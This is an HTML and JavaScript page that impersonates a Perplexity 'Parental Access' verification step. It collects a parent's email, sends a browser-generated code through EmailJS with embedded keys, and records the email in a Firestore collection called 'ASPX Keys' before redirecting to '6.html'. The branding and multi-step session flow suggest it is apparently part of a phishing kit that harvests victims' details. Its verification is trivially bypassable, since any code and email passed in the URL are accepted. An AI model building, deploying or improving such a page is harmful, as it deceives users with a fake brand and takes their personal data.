<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification - Perplexity</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        :root { --primary: #202124; --bg: #ffffff; --text: #000000; --gray: #70757a; --border: #e0e0e0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: var(--bg); color: var(--text); margin: 0; display: flex; justify-content: center; height: 100vh; }
        .container { width: 90%; max-width: 400px; text-align: center; margin-top: 60px; position: relative; }
        .close-btn { position: absolute; top: -30px; right: 0; font-size: 24px; color: #555; cursor: pointer; text-decoration: none; padding: 10px; }
        
        /* Perplexity Style Icon */
        .icon-wrapper { position: relative; width: 110px; height: 110px; margin: 0 auto 40px; border: 1.2px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .icon-wrapper::after { content: ''; position: absolute; width: 85px; height: 85px; border: 1.2px solid var(--border); border-radius: 50%; }
        .paper-plane { width: 38px; fill: #1a1a1b; transform: rotate(-10deg); }

        h1 { font-family: 'Times New Roman', Times, serif; font-size: 38px; font-weight: 500; margin: 0 0 20px 0; letter-spacing: -0.5px; }
        .subtext { font-size: 15px; color: var(--gray); line-height: 1.6; margin-bottom: 45px; }
        .email-highlight { color: #1a1a1b; font-weight: 500; }

        /* OTP Inputs */
        .otp-group { display: flex; justify-content: space-between; gap: 10px; margin-bottom: 35px; }
        .otp-input { width: 22%; height: 75px; border: 1.5px solid var(--border); border-radius: 12px; font-size: 32px; text-align: center; outline: none; transition: border-color 0.2s; }
        .otp-input:focus { border-color: #000; }
        
        .email-input { width: 100%; padding: 18px; border: 1.5px solid var(--border); border-radius: 12px; font-size: 16px; margin-bottom: 25px; box-sizing: border-box; outline: none; }

        button { width: 100%; padding: 18px; background: #b5b5b5; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: not-allowed; }
        button.active { background: #202124; cursor: pointer; }
        
        .hidden { display: none; }
        #status-msg { margin-top: 40px; font-size: 14px; color: var(--gray); }
    </style>
</head>
<body>

<div class="container">
    <a href="#" class="close-btn">✕</a>
    <div id="status-msg">Loading configuration...</div>

    <!-- UI STEP 1: ASK FOR PARENT EMAIL -->
    <div id="email-ui" class="hidden">
        <div class="icon-wrapper">
            <svg class="paper-plane" viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
        </div>
        <h1>Parental Access</h1>
        <p class="subtext">This account is set to Kids mode. Enter a parent's email to authorize sign-in.</p>
        <input type="email" id="pEmailInput" class="email-input" placeholder="parent@example.com">
        <button id="sendEmailBtn" class="active">Send Verification Link</button>
    </div>

    <!-- UI STEP 2: OTP ENTRY (Matches Screenshot) -->
    <div id="otp-ui" class="hidden">
        <div class="icon-wrapper">
            <svg class="paper-plane" viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
        </div>
        <h1>Check your email</h1>
        <p class="subtext">A temporary sign-in link has been sent to <br><span class="email-highlight" id="targetEmail"></span></p>
        
        <div class="otp-group">
            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 0)">
            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 1)">
            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 2)">
            <input type="number" class="otp-input" maxlength="1" oninput="stepNext(this, 3)">
        </div>
        <button id="confirmBtn">Confirm</button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    // --- 1. CONFIGURATION ---
    const firebaseConfig = { projectId: "question-metabase" }; // Add your full config here
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    emailjs.init("Yr9MutUoHOEONnFgn");

    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');
    const magicCode = urlParams.get('code'); 
    const magicEmail = urlParams.get('pemail'); // Added to capture email from magic link

    let generatedOtp = "";
    let localParentEmail = "";

    async function init() {
        if (!sessionId) {
            document.getElementById('status-msg').innerText = "Invalid Session.";
            return;
        }

        // --- 2. MAGIC LINK REDIRECT ---
        // If the URL contains both code and pemail, verify and redirect immediately
        if (magicCode && magicEmail) {
            await finalizeAccount(magicEmail);
            return;
        }

        try {
            const docRef = doc(db, "ASPX Keys", sessionId);
            const snap = await getDoc(docRef);

            if (snap.exists()) {
                const data = snap.data();

                // Direct redirect for non-kids accounts
                if (data.family === "no" || data.family === "busniess") {
                    window.location.href = "6.html";
                    return;
                }

                // Show parental email UI for kids/commit accounts
                if (data.family === "commit") {
                    document.getElementById('status-msg').classList.add('hidden');
                    document.getElementById('email-ui').classList.remove('hidden');
                } else if (data.family === "commited") {
                    window.location.href = "6.html";
                }
            }
        } catch (e) {
            document.getElementById('status-msg').innerText = "Connection error.";
        }
    }

    // --- 3. SENDING EMAIL & GENERATING LINK ---
    document.getElementById('sendEmailBtn').onclick = async () => {
        localParentEmail = document.getElementById('pEmailInput').value;
        if (!localParentEmail.includes('@')) return alert("Enter valid email");

        generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
        
        // We pass 'email' to the template so it can be added to the &pemail= URL param
        const templateParams = {
            email: localParentEmail,
            otp: generatedOtp,
            session: sessionId
        };

        try {
            document.getElementById('sendEmailBtn').innerText = "Sending...";
            await emailjs.send('service_1ij08zn', 'template_qxz1wka', templateParams);
            
            document.getElementById('targetEmail').innerText = localParentEmail;
            document.getElementById('email-ui').classList.add('hidden');
            document.getElementById('otp-ui').classList.remove('hidden');
        } catch (err) {
            alert("Email failed. Check your EmailJS settings.");
            document.getElementById('sendEmailBtn').innerText = "Send Verification Link";
        }
    };

    // --- 4. MANUAL OTP CONFIRM ---
    document.getElementById('confirmBtn').onclick = async () => {
        const inputs = document.querySelectorAll('.otp-input');
        let enteredCode = Array.from(inputs).map(i => i.value).join('');

        if (enteredCode === generatedOtp) {
            await finalizeAccount(localParentEmail);
        } else {
            alert("Invalid code.");
        }
    };

    // --- 5. FIREBASE UPDATE & REDIRECT ---
    async function finalizeAccount(guardianEmail) {
        try {
            const docRef = doc(db, "ASPX Keys", sessionId);
            await updateDoc(docRef, {
                family: "commited", 
                guardians: guardianEmail, // Stores the real email from the link or input
                updatedAt: new Date().toLocaleString()
            });
            window.location.href = "6.html";
        } catch (e) {
            alert("Update failed: " + e.message);
        }
    }

    // UI Helper
    window.stepNext = (el, idx) => {
        const inputs = document.querySelectorAll('.otp-input');
        if (el.value.length === 1 && idx < 3) inputs[idx + 1].focus();
        let isDone = Array.from(inputs).every(i => i.value !== "");
        if(isDone) document.getElementById('confirmBtn').classList.add('active');
    };

    init();
</script>
</body>
</html>
